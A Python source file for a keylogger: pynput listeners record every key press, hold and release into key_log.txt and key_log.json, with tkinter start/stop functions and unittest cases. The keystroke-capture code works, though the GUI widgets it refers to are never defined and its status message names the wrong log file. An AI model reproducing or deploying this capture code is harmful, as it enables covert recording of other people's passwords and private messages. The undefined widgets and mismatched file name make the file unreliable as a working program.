import tkinter as tk
from tkinter import *
from pynput import keyboard
import json
import unittest
from unittest.mock import mock_open, patch

keys_used = []
flag = False
keys = ""

def generate_text_log(key):
    with open('key_log.txt', "w+") as keys_file:
        keys_file.write(key)

def generate_json_file(keys_used):
    with open('key_log.json', '+wb') as key_log:
        key_list_bytes = json.dumps(keys_used).encode()
        key_log.write(key_list_bytes)

def on_press(key):
    global flag, keys_used, keys
    if not flag:
        keys_used.append({'Pressed': f'{key}'})
        flag = True

    if flag:
        keys_used.append({'Held': f'{key}'})
    generate_json_file(keys_used)

def on_release(key):
    global flag, keys_used, keys
    keys_used.append({'Released': f'{key}'})

    if flag:
        flag = False
    generate_json_file(keys_used)

    keys += str(key)
    generate_text_log(str(keys))

def start_keylogger():
    global listener
    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()
    label.config(text="[+] Keylogger is running!\n[!] Saving the keys in 'keylogger.txt'")
    start_button.config(state='disabled')
    stop_button.config(state='normal')

def stop_keylogger():
    global listener
    listener.stop()
    label.config(text="Keylogger stopped.")
    start_button.config(state='normal')
    stop_button.config(state='disabled')

class TestKeylogger(unittest.TestCase):
    @patch('builtins.open', new_callable=mock_open)
    def test_generate_text_log(self, mock_file):
        generate_text_log('test_key')
        mock_file.assert_called_once_with('key_log.txt', 'w+')
        mock_file().write.assert_called_once_with('test_key')

    @patch('builtins.open', new_callable=mock_open)
    def test_generate_json_file(self, mock_file):
        keys_used = [{'Pressed': 'a'}, {'Released': 'b'}]
        generate_json_file(keys_used)
        mock_file.assert_called_once_with('key_log.json', '+wb')
        mock_file().write.assert_called_once_with(json.dumps(keys_used).encode())

    def test_on_press(self):
        global keys_used, flag
        keys_used = []
        flag = False
        on_press('a')
        self.assertEqual(keys_used, [{'Pressed': 'a'}, {'Held': 'a'}])

    def test_on_release(self):
        global keys_used, flag, keys
        keys_used = []
        flag = True
        keys = 'abc'
        on_release('d')
        self.assertEqual(keys_used, [{'Released': 'd'}])
        self.assertEqual(flag, False)
        self.assertEqual(keys, 'abcd')

if __name__ == '__main__':
    unittest.main()
